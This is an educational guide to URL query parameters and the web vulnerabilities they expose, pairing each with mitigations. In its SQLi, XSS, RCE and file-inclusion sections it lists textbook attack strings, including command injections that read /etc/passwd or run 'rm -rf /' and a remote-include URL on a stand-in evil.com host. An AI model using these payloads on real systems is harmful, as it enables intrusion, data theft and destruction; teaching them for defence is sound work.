# Query Parameters

### **1. Overview of URL Query Parameters**

Query parameters are key-value pairs appended to URLs, allowing a client to pass additional data to a web server. They're introduced by a `?` following the URL's path, and multiple parameters are separated by `&`.

**Example URL:**

```
<https://example.com/search?query=apple&page=2&sort=desc>

```

In this example:

- `query=apple`: The user is searching for "apple".
- `page=2`: The user is on page 2.
- `sort=desc`: The results are sorted in descending order.

---

### **2. Common Query Parameter Types**

- **User Input Fields**: These include search inputs, user IDs, and other form data that are passed via query strings.
    - Example: `search.php?q=hello`
- **Pagination & Sorting**: Commonly used to navigate between multiple pages of results.
    - Example: `products.php?page=2&sort=price_asc`
- **Filtering**: Used to refine search or product results.
    - Example: `products.php?category=electronics&brand=apple`
- **Session and User Identifiers**: Sometimes used to track users, but when misused, they can lead to session hijacking or other serious security risks.
    - Example: `profile.php?user_id=12345`
- **API Calls**: Used in RESTful APIs to pass parameters like API keys, format specifications, and resource identifiers.
    - Example: `api.example.com/v1/resource?api_key=123abc&format=json`

---

### **3. Types of Vulnerabilities Related to URL Query Parameters**

URL query parameters are often vulnerable to various security risks, particularly if not properly validated or sanitized. Below are detailed descriptions of common vulnerabilities.

---

### **3.1. SQL Injection (SQLi)**

**Vulnerability Description**: SQL injection occurs when untrusted input is directly embedded into an SQL query without proper sanitization. Attackers can manipulate the query parameters to execute arbitrary SQL commands, potentially leading to unauthorized access to the database.

**Commonly Exploited Query Parameters**:

- User IDs, search queries, product filters, etc.

**Example URL**:

```
<https://example.com/products.php?id=10>

```

**Vulnerable SQL Query**:

```sql
SELECT * FROM products WHERE id = '$id';

```

If `id` is unsanitized, an attacker could use the following payload to manipulate the query:

```
<https://example.com/products.php?id=10> OR 1=1--

```

This changes the SQL query to:

```sql
SELECT * FROM products WHERE id = 10 OR 1=1-- ;

```

The `OR 1=1` always evaluates to true, potentially dumping all records in the table.

**Mitigation**:

- Use prepared statements with parameterized queries.
- Example:

```php
$stmt = $pdo->prepare('SELECT * FROM products WHERE id = :id');
$stmt->execute(['id' => $id]);

```

**Exploitable Parameters**:

- `id=`
- `name=`
- `product=`

**Potential Attack Strings**:

- `' OR 1=1 --`
- `admin'--`

---

### **3.2. Cross-Site Scripting (XSS)**

**Vulnerability Description**: Cross-Site Scripting occurs when untrusted input is reflected back to the user in a way that allows the execution of malicious scripts. If query parameters are not properly encoded, they can inject JavaScript code into the web page.

**Example URL**:

```
<https://example.com/search.php?q=><script>alert('XSS')</script>

```

If the server reflects the query string without proper encoding, the JavaScript code will execute in the browser, leading to XSS attacks.

**Vulnerable Code**:

```php
echo "<h1>Search results for: " . $_GET['q'] . "</h1>";

```

**Mitigation**:

- Properly escape output (e.g., `htmlspecialchars()` in PHP).
- Use Content Security Policy (CSP) headers.

**Exploitable Parameters**:

- `q=`
- `search=`
- `msg=`

**Potential Attack Strings**:

- `<script>alert('XSS')</script>`
- `"><img src=x onerror=alert(1)>`

---

### **3.3. Cross-Site Request Forgery (CSRF)**

**Vulnerability Description**: CSRF forces a logged-in user to perform unwanted actions on a web application in which they are authenticated, using query parameters in GET requests that perform state-changing operations.

**Example URL**:

```
<https://example.com/account/delete?user_id=123>

```

If a victim is tricked into visiting a malicious link, the attack could perform unwanted actions (e.g., deleting their account).

**Mitigation**:

- Use anti-CSRF tokens in forms and validate them on the server-side.
- Ensure that state-changing actions are not performed via GET requests.

**Exploitable Parameters**:

- `action=`
- `delete=`
- `update=`

---

### **3.4. Open Redirects**

**Vulnerability Description**: Open redirect vulnerabilities occur when query parameters are used to specify the target URL for redirects, and the input is not properly validated. Attackers can exploit this to trick users into visiting malicious sites.

**Example URL**:

```
<https://example.com/redirect.php?url=http://evil.com>

```

If `url` is not validated, users could be redirected to a phishing site.

**Mitigation**:

- Validate and whitelist redirect destinations.
- Avoid allowing user-controlled redirects unless absolutely necessary.

**Exploitable Parameters**:

- `url=`
- `goto=`
- `redirect=`

**Potential Attack Strings**:

- `https://evil.com`
- `//evil.com`

---

### **3.5. Remote Code Execution (RCE)**

**Vulnerability Description**: RCE happens when an attacker can control input that is executed by the server, potentially leading to the execution of arbitrary code. This can occur when dangerous functions are used to process query parameters.

**Example URL**:

```
<https://example.com/run.php?cmd=ls>

```

If the server directly uses the `cmd` parameter in a shell command without sanitization, an attacker could execute arbitrary commands.

**Vulnerable Code**:

```php
system($_GET['cmd']);

```

An attacker could use:

```
<https://example.com/run.php?cmd=ls;cat> /etc/passwd

```

**Mitigation**:

- Avoid directly executing user-supplied input.
- Use secure functions (e.g., PHP’s `escapeshellarg()`).

**Exploitable Parameters**:

- `cmd=`
- `exec=`
- `action=`

**Potential Attack Strings**:

- `; cat /etc/passwd`
- `&& rm -rf /`

---

### **3.6. Local File Inclusion (LFI) / Remote File Inclusion (RFI)**

**Vulnerability Description**: File inclusion vulnerabilities occur when a server uses a query parameter to dynamically include files. If unvalidated, an attacker can include local or remote files, leading to code execution or data exposure.

**Example URL**:

```
<https://example.com/include.php?file=header.php>

```

An attacker might try:

```
<https://example.com/include.php?file=../../etc/passwd>

```

For RFI, an attacker might use a remote URL to include malicious scripts.

**Mitigation**:

- Restrict file inclusion to specific directories.
- Use whitelisting of allowed files.

**Exploitable Parameters**:

- `file=`
- `template=`
- `page=`

**Potential Attack Strings**:

- `../../etc/passwd`
- `http://evil.com/shell.php`

---

### **4. Common Dangerous Functions in Web Applications**

1. **`eval()`** – Can execute arbitrary code if user input is passed directly into it.
2. **`system()`/`exec()`** – Executes system commands; vulnerable if user input is not properly sanitized.
3. **`include()`/`require()`** – Can include files; vulnerable to LFI/RFI if the file path is not validated.
4. **`preg_replace()`** with `/e` modifier – Allows code execution through regular expressions.
5. **`unserialize()`** – If used with untrusted data, can lead to object injection.

---

### **5. Best Practices for Securing Query Parameters**

- **Input Validation**: Always validate input on the server-side using whitelists.
- **Output Encoding**: Use proper output encoding (e.g., `htmlspecialchars()` for HTML).
- **Use Parameterized Queries**: For SQL queries, always use parameterized queries or prepared statements.
- **Limit Data Exposure**: Don’t expose sensitive data in URLs, such as session tokens or API keys.
- **Avoid GET for State Changes**: Use POST requests for any state-changing operations (e.g., delete, update).
- **Use HTTPS**: Always use HTTPS to protect query parameters from being intercepted.
